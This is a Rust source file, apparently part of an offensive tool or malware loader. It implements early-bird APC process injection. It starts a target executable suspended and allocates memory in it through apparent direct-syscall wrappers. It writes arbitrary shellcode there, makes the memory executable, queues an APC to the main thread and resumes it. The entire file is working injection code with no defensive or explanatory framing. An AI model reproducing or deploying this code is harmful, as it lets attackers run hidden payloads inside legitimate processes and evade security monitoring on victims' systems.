#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Threading::{
        CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED,
    },
};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

#[cfg(target_os = "windows")]
pub fn inject_apc(target_exe: &str, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_queue_apc, nt_resume_thread};
    use core::ptr::null_mut;
    use std::ffi::CString;

    let exe_cstr = CString::new(target_exe).map_err(|_| "invalid exe path")?;

    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            exe_cstr.as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err("CreateProcessA failed");
    }

    let proc = pi.hProcess as isize;
    let thread = pi.hThread as isize;

    let mut base: *mut u8 = null_mut();
    let mut size: usize = shellcode.len().max(0x1000);
    let status = unsafe {
        nt_alloc(proc, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if status < 0 || base.is_null() {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("alloc failed");
    }

    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written)
    };
    if status < 0 {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("write failed");
    }

    let mut old_prot: u32 = 0;
    let mut prot_size: usize = size;
    let mut prot_base = base;
    let status = unsafe {
        nt_protect(proc, &mut prot_base, &mut prot_size, PAGE_EXECUTE_READ, &mut old_prot)
    };
    if status < 0 {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("protect failed");
    }

    let status = unsafe {
        nt_queue_apc(thread, base as *const u8, null_mut(), null_mut(), null_mut())
    };
    if status < 0 {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("queue apc failed");
    }

    let mut suspend_count: u32 = 0;
    unsafe {
        nt_resume_thread(thread, &mut suspend_count);
        CloseHandle(pi.hProcess as _);
        CloseHandle(pi.hThread as _);
    }

    Ok(())
}
